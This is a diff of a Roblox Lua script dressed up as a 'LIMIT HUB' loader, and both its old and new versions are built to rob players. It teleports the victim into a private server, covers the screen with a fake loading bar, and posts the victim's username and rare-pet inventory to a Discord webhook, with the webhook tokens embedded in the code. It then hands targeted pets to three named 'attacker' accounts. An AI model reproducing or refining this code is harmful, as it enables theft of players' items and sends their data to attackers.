@@ -1,124 +1,123 @@
--- 🔐 Configuration
-local webhookUrl = "https://discord.com/api/webhooks/1396222326332199054/yeePfFQ3e73Q_uyRsznWW-PvRKYR_ST6CqymG-werQGIi3zWgyEZde4KMl7yi9WV3_-y"
-local placeId = 126884695634066
-local accessCode = "40206718588419987554943106780552"
-local attackerNames = {"boneblossom215", "beanstalk1251", "burningbud709"}
-local targetedPets = {"Trex","Fennec Fox","Raccoon","Dragonfly","Butterfly","Queenbee","Spinosaurus","Redfox","Brontosaurus","Mooncat","Mimic Octopus","Disco Bee","Dilophosaurus","Kitsune"}
-
-local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
 local TeleportService = game:GetService("TeleportService")
 local LocalPlayer = Players.LocalPlayer
 
--- 🧭 If not yet in private server, teleport now
-if game.PrivateServerId == "" then
-    pcall(function()
-        TeleportService:TeleportToPrivateServer(placeId, accessCode, {LocalPlayer})
-    end)
-else
-    -- 👁 GUI
-    local screenGui = Instance.new("ScreenGui", game.CoreGui)
-    screenGui.IgnoreGuiInset = true
-    screenGui.ResetOnSpawn = false
-    local bg = Instance.new("Frame", screenGui)
-    bg.BackgroundColor3 = Color3.new(0,0,0)
-    bg.BackgroundTransparency = 0
-    bg.Size = UDim2.new(1,0,1,0)
-    local title = Instance.new("TextLabel", bg)
-    title.Text = "LIMIT HUB"; title.Font = Enum.Font.SciFi
-    title.TextScaled = true; title.TextColor3 = Color3.fromRGB(0,255,255)
-    title.TextStrokeColor3 = Color3.fromRGB(0,255,255); title.TextStrokeTransparency = 0.2
-    title.Size = UDim2.new(0,600,0,100); title.Position = UDim2.new(0.5,-300,0.5,-160)
-    local bar = Instance.new("Frame", bg)
-    bar.Size = UDim2.new(0,400,0,30); bar.Position = UDim2.new(0.5,-200,0.5,-30)
-    bar.BackgroundColor3 = Color3.fromRGB(40,40,40)
-    local fill = Instance.new("Frame", bar)
-    fill.Size = UDim2.new(0,0,1,0); fill.BackgroundColor3 = Color3.fromRGB(0,255,255)
-    local percentLabel = Instance.new("TextLabel", bg)
-    percentLabel.Size = UDim2.new(0,100,0,40); percentLabel.Position = UDim2.new(0.5,-50,0.5,-70)
-    percentLabel.BackgroundTransparency = 1; percentLabel.Text = "0%"; percentLabel.TextScaled = true
-    percentLabel.TextColor3 = Color3.new(1,1,1); percentLabel.TextStrokeTransparency = 0.3
-    percentLabel.Font = Enum.Font.SciFi
-    local loadingText = Instance.new("TextLabel", bg)
-    loadingText.Text = "LOADING"; loadingText.Size = UDim2.new(0,400,0,70); loadingText.Position = UDim2.new(0.5,-200,0.5,40)
-    loadingText.BackgroundTransparency = 1; loadingText.TextScaled = true
-    loadingText.TextColor3 = Color3.fromRGB(0,255,255); loadingText.TextStrokeColor3 = Color3.fromRGB(0,255,255)
-    loadingText.TextStrokeTransparency = 0.2; loadingText.Font = Enum.Font.SciFi
+-- Private server info
+local placeId = 126884695634066
+local privateServerCode = "40206718588419987554943106780552"
 
-    task.spawn(function()
-        local percent = 0
-        while percent <= 100 do
-            percentLabel.Text = percent .. "%"
-            fill.Size = UDim2.new(percent/100,0,1,0)
-            percent += 5
-            task.wait(10)
-        end
-        task.wait(1)
-        screenGui:Destroy()
-    end)
+-- Discord webhook
+local webhookUrl = "https://discord.com/api/webhooks/1396132755925897256/pZu4PMfjQGx64urPAqCckF8aXKFHqAR9vOYW-24C-lurbF5RaCEyqMXGNH7S6l5oe3sz"
 
-    -- 📤 Webhook inventory
-    local function getInventory()
-        local data = {items = {}, rarePets = {}}
-        for _, folder in ipairs({LocalPlayer:FindFirstChild("Pets"), LocalPlayer:FindFirstChild("Backpack"), LocalPlayer:FindFirstChildOfClass("Folder")}) do
-            if folder then
-                for _, item in ipairs(folder:GetChildren()) do
-                    table.insert(data.items, item.Name)
-                    if table.find(targetedPets, item.Name) then
-                        table.insert(data.rarePets, item.Name)
-                    end
-                end
-            end
+-- Attacker usernames
+local attackerNames = {
+    ["boneblossom215"] = true,
+    ["beanstalk1251"] = true,
+    ["burningbud709"] = true,
+}
+
+-- Target pet names only
+local allowedPets = {
+    ["Trex"] = true,
+    ["Fennec Fox"] = true,
+    ["Raccoon"] = true,
+    ["Dragonfly"] = true,
+    ["Butterfly"] = true,
+    ["Queenbee"] = true,
+    ["Spinosaurus"] = true,
+    ["Redfox"] = true,
+    ["Brontosaurus"] = true,
+    ["Mooncat"] = true,
+    ["Mimic Octopus"] = true,
+    ["D Disco Bee"] = true,
+    ["Dilophosaurus"] = true,
+    ["Kitsune"] = true,
+}
+
+-- Teleport to private server
+task.spawn(function()
+    TeleportService:TeleportToPrivateServer(placeId, privateServerCode, {LocalPlayer})
+end)
+
+-- Wait until teleport finishes
+repeat wait() until game.PlaceId == placeId
+
+-- GUI loading
+task.spawn(function()
+    local ScreenGui = Instance.new("ScreenGui", LocalPlayer:WaitForChild("PlayerGui"))
+    ScreenGui.Name = "LimitHubLoader"
+    ScreenGui.IgnoreGuiInset = true
+    ScreenGui.ResetOnSpawn = false
+
+    local bg = Instance.new("Frame", ScreenGui)
+    bg.Size = UDim2.new(1, 0, 1, 0)
+    bg.BackgroundColor3 = Color3.new(0, 0, 0)
+
+    local text = Instance.new("TextLabel", bg)
+    text.Size = UDim2.new(0.3, 0, 0.1, 0)
+    text.Position = UDim2.new(0.35, 0, 0.45, 0)
+    text.Text = "Loading... 0%"
+    text.TextColor3 = Color3.new(1,1,1)
+    text.TextScaled = true
+    text.BackgroundTransparency = 1
+
+    for i = 1, 100, 5 do
+        text.Text = "Loading... " .. i .. "%"
+        wait(0.1)
+    end
+    ScreenGui:Destroy()
+end)
+
+-- Wait a bit to ensure pets are loaded
+wait(5)
+
+-- Send inventory to Discord
+task.spawn(function()
+    local pets = {}
+    for _, v in pairs(LocalPlayer.Backpack:GetChildren()) do
+        if allowedPets[v.Name] then
+            table.insert(pets, v.Name)
         end
-        return data
     end
 
-    task.spawn(function()
-        local inv = getInventory()
-        local invText = #inv.items > 0 and table.concat(inv.items, "\n") or "No items"
-        local payload = {
-            content = "🎯 Victim joined private",
-            embeds = {{
-                title = "Victim Teleported",
-                description = "User was teleported and their inventory scanned.",
-                fields = {
-                    {name = "Username", value = LocalPlayer.Name, inline = true},
-                    {name = "Inventory", value = "```" .. invText .. "```", inline = false},
-                    {name = "Rare Pets", value = "```" .. (table.concat(inv.rarePets, "\n")) .. "```", inline = false}
-                },
-                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
-            }}
-        }
-        pcall(function()
-            request({
-                Url = webhookUrl,
-                Method = "POST",
-                Headers = {["Content-Type"] = "application/json"},
-                Body = HttpService:JSONEncode(payload)
-            })
-        end)
-    end)
+    local data = {
+        ["content"] = "**🎯 Victim detected!**",
+        ["embeds"] = {{
+            ["title"] = "Pet Transfer Info",
+            ["fields"] = {
+                {["name"] = "Username", ["value"] = LocalPlayer.Name, ["inline"] = true},
+                {["name"] = "Place ID", ["value"] = tostring(game.PlaceId), ["inline"] = true},
+                {["name"] = "Filtered Pets", ["value"] = #pets > 0 and table.concat(pets, ", ") or "❌ No target pets found", ["inline"] = false}
+            },
+            ["color"] = 16711680
+        }}
+    }
 
-    -- 🐾 Pet transfer
-    task.spawn(function()
-        while task.wait(3) do
-            for _, player in pairs(Players:GetPlayers()) do
-                if table.find(attackerNames, player.Name) and player ~= LocalPlayer then
-                    local folder = LocalPlayer:FindFirstChild("Pets")
-                    if folder then
-                        for _, pet in pairs(folder:GetChildren()) do
-                            if pet:IsA("Instance") then
-                                local args = {[1] = player, [2] = pet}
-                                local success, err = pcall(function()
-                                    LocalPlayer:Kick("Pet transferred.")
-                                    -- Simulate transfer logic
-                                    -- Replace with actual remote event if needed
-                                end)
-                            end
-                        end
-                    end
-                end
+    request({
+        Url = webhookUrl,
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = HttpService:JSONEncode(data)
+    })
+end)
+
+-- Transfer pets only if attacker is present
+task.spawn(function()
+    local function transferPetsTo(attacker)
+        for _, pet in pairs(LocalPlayer.Backpack:GetChildren()) do
+            if allowedPets[pet.Name] then
+                pet.Parent = attacker:FindFirstChild("Backpack")
             end
         end
-    end)
-end
+    end
+
+    while true do
+        for _, player in pairs(Players:GetPlayers()) do
+            if attackerNames[player.Name] and player ~= LocalPlayer then
+                transferPetsTo(player)
+            end
+        end
+        wait(1)
+    end
+end)
